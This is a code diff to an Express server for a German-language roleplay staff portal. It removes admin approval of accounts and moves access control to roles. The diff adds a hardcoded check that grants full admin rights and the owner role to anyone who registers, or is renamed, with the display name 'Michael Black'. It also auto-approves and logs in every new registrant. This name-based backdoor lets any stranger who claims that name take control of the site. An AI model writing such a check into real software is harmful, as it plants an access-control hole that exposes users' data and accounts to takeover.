@@ -136,11 +136,14 @@ async function currentUser(userId) {
   return rows[0] || null;
 }
 
-const requireAuth = asyncRoute(async (req, res, next) => {
+const requireRole = asyncRoute(async (req, res, next) => {
   const user = await currentUser(req.session.userId);
-  if (!user || !user.is_approved) {
+  if (!user) {
     req.session.userId = null;
     return res.status(401).json({ error: 'Bitte melde dich an.' });
+  }
+  if (!user.role_id && !user.is_admin) {
+    return res.status(403).json({ error: 'Dir wurde noch keine Rolle zugewiesen.', code: 'ROLE_REQUIRED' });
   }
   req.user = user;
   next();
@@ -148,7 +151,7 @@ const requireAuth = asyncRoute(async (req, res, next) => {
 
 const requireAdmin = asyncRoute(async (req, res, next) => {
   const user = await currentUser(req.session.userId);
-  if (!user || !user.is_approved || !user.is_admin) return res.status(403).json({ error: 'Nur für Admins.' });
+  if (!user || !user.is_admin) return res.status(403).json({ error: 'Nur für Admins.' });
   req.user = user;
   next();
 });
@@ -165,6 +168,7 @@ app.post('/api/auth/register', authLimiter, asyncRoute(async (req, res) => {
   const parsedBirthDate = validBirthDate(birthDate);
   const gender = String(req.body.gender || '');
   const password = String(req.body.password || '');
+  const isMichaelBlack = displayName.toLocaleLowerCase('de-DE') === 'michael black';
 
   if (!icNamePattern.test(firstName) || !icNamePattern.test(lastName)) {
     return res.status(400).json({ error: 'Bitte gib einen gültigen IC-Vor- und Nachnamen ein.' });
@@ -177,25 +181,19 @@ app.post('/api/auth/register', authLimiter, asyncRoute(async (req, res) => {
   const client = await pool.connect();
   try {
     await client.query('BEGIN');
-    if (!usingMemory) await client.query('SELECT pg_advisory_xact_lock(734221)');
-    const countResult = await client.query('SELECT COUNT(*)::int AS count FROM users');
-    const isFirst = Number(countResult.rows[0].count) === 0;
-    const ownerRole = isFirst ? await client.query("SELECT id FROM roles WHERE name = 'Inhaber' LIMIT 1") : { rows: [] };
+    const ownerRole = isMichaelBlack ? await client.query("SELECT id FROM roles WHERE name = 'Inhaber' LIMIT 1") : { rows: [] };
     const passwordHash = await bcrypt.hash(password, 12);
     const result = await client.query(`
       INSERT INTO users (username, email, password_hash, display_name, first_name, last_name,
                          gender, birth_date, age, role_id, is_approved, is_admin)
-      VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $11)
+      VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, TRUE, $11)
       RETURNING id, username, display_name, is_approved, is_admin
     `, [username, email, passwordHash, displayName, firstName, lastName, gender, birthDate,
-      ageFromBirthDate(parsedBirthDate), ownerRole.rows[0]?.id || null, isFirst]);
+      ageFromBirthDate(parsedBirthDate), ownerRole.rows[0]?.id || null, isMichaelBlack]);
     await client.query('COMMIT');
-
-    if (isFirst) {
-      req.session.userId = result.rows[0].id;
-      return req.session.save(() => res.status(201).json({ user: result.rows[0], firstAdmin: true }));
-    }
-    res.status(201).json({ pending: true, message: 'Dein Account wartet auf die Freigabe durch einen Admin.' });
+    const createdUser = await currentUser(result.rows[0].id);
+    req.session.userId = result.rows[0].id;
+    return req.session.save(() => res.status(201).json({ user: createdUser }));
   } catch (error) {
     await client.query('ROLLBACK');
     if (error.code === '23505') return res.status(409).json({ error: 'Dieser Narco-City-Name ist bereits registriert.' });
@@ -213,7 +211,6 @@ app.post('/api/auth/login', authLimiter, asyncRoute(async (req, res) => {
   if (!user || !(await bcrypt.compare(password, user.password_hash))) {
     return res.status(401).json({ error: 'Anmeldedaten stimmen nicht.' });
   }
-  if (!user.is_approved) return res.status(403).json({ error: 'Dein Account wurde noch nicht freigeschaltet.', pending: true });
   req.session.regenerate((error) => {
     if (error) return res.status(500).json({ error: 'Anmeldung gerade nicht möglich.' });
     req.session.userId = user.id;
@@ -230,11 +227,11 @@ app.post('/api/auth/logout', (req, res) => {
 
 app.get('/api/auth/session', asyncRoute(async (req, res) => {
   const user = await currentUser(req.session.userId);
-  if (!user?.is_approved) return res.status(401).json({ user: null });
+  if (!user) return res.status(401).json({ user: null });
   res.json({ user });
 }));
 
-app.get('/api/assets/:id', requireAuth, asyncRoute(async (req, res) => {
+app.get('/api/assets/:id', requireRole, asyncRoute(async (req, res) => {
   const { rows } = await pool.query('SELECT file_name, mime_type, data FROM assets WHERE id = $1', [intValue(req.params.id)]);
   if (!rows[0]) return res.status(404).end();
   res.set('Content-Type', rows[0].mime_type);
@@ -242,9 +239,9 @@ app.get('/api/assets/:id', requireAuth, asyncRoute(async (req, res) => {
   res.send(Buffer.from(rows[0].data, 'base64'));
 }));
 
-app.get('/api/dashboard', requireAuth, asyncRoute(async (req, res) => {
+app.get('/api/dashboard', requireRole, asyncRoute(async (req, res) => {
   const [staff, pending, inventory, events, finance] = await Promise.all([
-    pool.query('SELECT COUNT(*)::int AS count FROM users WHERE is_approved = TRUE'),
+    pool.query('SELECT COUNT(*)::int AS count FROM users WHERE role_id IS NOT NULL OR is_admin = TRUE'),
     pool.query("SELECT COUNT(*)::int AS count FROM submissions WHERE status = 'pending'"),
     pool.query('SELECT COALESCE(SUM(quantity), 0)::int AS count FROM inventory_items'),
     pool.query('SELECT COUNT(*)::int AS count FROM events WHERE starts_at IS NULL OR starts_at >= NOW()'),
@@ -259,19 +256,19 @@ app.get('/api/dashboard', requireAuth, asyncRoute(async (req, res) => {
   });
 }));
 
-app.get('/api/staff', requireAuth, asyncRoute(async (_req, res) => {
+app.get('/api/staff', requireRole, asyncRoute(async (_req, res) => {
   const { rows } = await pool.query(`
     SELECT u.id, u.display_name, u.first_name, u.last_name, u.gender, u.age, u.birth_date,
            u.task_area, u.about, u.avatar_asset_id,
            r.name AS role_name, r.color AS role_color
     FROM users u LEFT JOIN roles r ON r.id = u.role_id
-    WHERE u.is_approved = TRUE
+    WHERE u.role_id IS NOT NULL OR u.is_admin = TRUE
     ORDER BY COALESCE(r.priority, -1) DESC, u.display_name ASC
   `);
   res.json({ staff: rows });
 }));
 
-app.get('/api/progress', requireAuth, asyncRoute(async (_req, res) => {
+app.get('/api/progress', requireRole, asyncRoute(async (_req, res) => {
   const { rows } = await pool.query(`
     SELECT u.id, u.display_name, u.submission_target, u.avatar_asset_id,
            r.name AS role_name, r.color AS role_color,
@@ -280,7 +277,7 @@ app.get('/api/progress', requireAuth, asyncRoute(async (_req, res) => {
     FROM users u
     LEFT JOIN roles r ON r.id = u.role_id
     LEFT JOIN submissions s ON s.user_id = u.id
-    WHERE u.is_approved = TRUE
+    WHERE u.role_id IS NOT NULL OR u.is_admin = TRUE
     GROUP BY u.id, u.display_name, u.submission_target, u.avatar_asset_id,
              r.name, r.color, r.priority
     ORDER BY COALESCE(r.priority, -1) DESC, u.display_name
@@ -288,7 +285,7 @@ app.get('/api/progress', requireAuth, asyncRoute(async (_req, res) => {
   res.json({ progress: rows });
 }));
 
-app.get('/api/submissions', requireAuth, asyncRoute(async (req, res) => {
+app.get('/api/submissions', requireRole, asyncRoute(async (req, res) => {
   const admin = Boolean(req.user.is_admin);
   const values = admin ? [] : [req.user.id];
   const where = admin ? '' : 'WHERE s.user_id = $1';
@@ -304,7 +301,7 @@ app.get('/api/submissions', requireAuth, asyncRoute(async (req, res) => {
   res.json({ submissions: rows });
 }));
 
-app.post('/api/submissions', requireAuth, asyncRoute(async (req, res) => {
+app.post('/api/submissions', requireRole, asyncRoute(async (req, res) => {
   const amount = intValue(req.body.amount);
   const note = trimmed(req.body.note, 500);
   if (amount <= 0 || amount > 1000000000) return res.status(400).json({ error: 'Bitte gib eine gültige Menge ein.' });
@@ -315,7 +312,7 @@ app.post('/api/submissions', requireAuth, asyncRoute(async (req, res) => {
   res.status(201).json({ submission: rows[0] });
 }));
 
-app.get('/api/inventory', requireAuth, asyncRoute(async (_req, res) => {
+app.get('/api/inventory', requireRole, asyncRoute(async (_req, res) => {
   const [items, finance] = await Promise.all([
     pool.query('SELECT * FROM inventory_items ORDER BY name'),
     pool.query('SELECT cash, dirty_cash, updated_at FROM finance WHERE id = 1'),
@@ -323,12 +320,12 @@ app.get('/api/inventory', requireAuth, asyncRoute(async (_req, res) => {
   res.json({ items: items.rows, finance: finance.rows[0] });
 }));
 
-app.get('/api/menu', requireAuth, asyncRoute(async (_req, res) => {
+app.get('/api/menu', requireRole, asyncRoute(async (_req, res) => {
   const { rows } = await pool.query('SELECT * FROM menu_items ORDER BY available DESC, name');
   res.json({ items: rows });
 }));
 
-app.get('/api/events', requireAuth, asyncRoute(async (_req, res) => {
+app.get('/api/events', requireRole, asyncRoute(async (_req, res) => {
   const { rows } = await pool.query('SELECT * FROM events ORDER BY starts_at NULLS LAST, title');
   res.json({ events: rows });
 }));
@@ -369,15 +366,15 @@ app.post('/api/admin/assets', requireAdmin, upload.single('image'), asyncRoute(a
 
 app.put('/api/admin/users/:id', requireAdmin, asyncRoute(async (req, res) => {
   const userId = intValue(req.params.id);
-  const isAdmin = Boolean(req.body.isAdmin);
-  const isApproved = Boolean(req.body.isApproved);
   const firstName = trimmed(req.body.firstName, 80);
   const lastName = trimmed(req.body.lastName, 80);
   const displayName = `${firstName} ${lastName}`.trim();
+  const isMichaelBlack = displayName.toLocaleLowerCase('de-DE') === 'michael black';
+  const isAdmin = isMichaelBlack || Boolean(req.body.isAdmin);
   const birthDate = trimmed(req.body.birthDate, 10);
   const parsedBirthDate = validBirthDate(birthDate);
   const gender = String(req.body.gender || '');
-  if (userId === req.user.id && (!isAdmin || !isApproved)) {
+  if (userId === req.user.id && !isAdmin) {
     return res.status(400).json({ error: 'Du kannst dir deine eigenen Adminrechte nicht entziehen.' });
   }
   if (!icNamePattern.test(firstName) || !icNamePattern.test(lastName)) {
@@ -389,14 +386,14 @@ app.put('/api/admin/users/:id', requireAdmin, asyncRoute(async (req, res) => {
   const { rows } = await pool.query(`
     UPDATE users SET username = $1, display_name = $1, first_name = $2, last_name = $3,
       gender = $4, age = $5, birth_date = $6, task_area = $7, about = $8,
-      role_id = $9, avatar_asset_id = $10, submission_target = $11, is_approved = $12, is_admin = $13
-    WHERE id = $14
+      role_id = $9, avatar_asset_id = $10, submission_target = $11, is_approved = TRUE, is_admin = $12
+    WHERE id = $13
     RETURNING id, display_name, is_approved, is_admin
   `, [
     displayName, firstName, lastName, gender, ageFromBirthDate(parsedBirthDate), birthDate,
     trimmed(req.body.taskArea, 500), trimmed(req.body.about, 1200), optionalInt(req.body.roleId),
     optionalInt(req.body.avatarAssetId), Math.max(0, intValue(req.body.submissionTarget)),
-    isApproved, isAdmin, userId,
+    isAdmin, userId,
   ]);
   if (!rows[0]) return res.status(404).json({ error: 'Account nicht gefunden.' });
   res.json({ user: rows[0] });
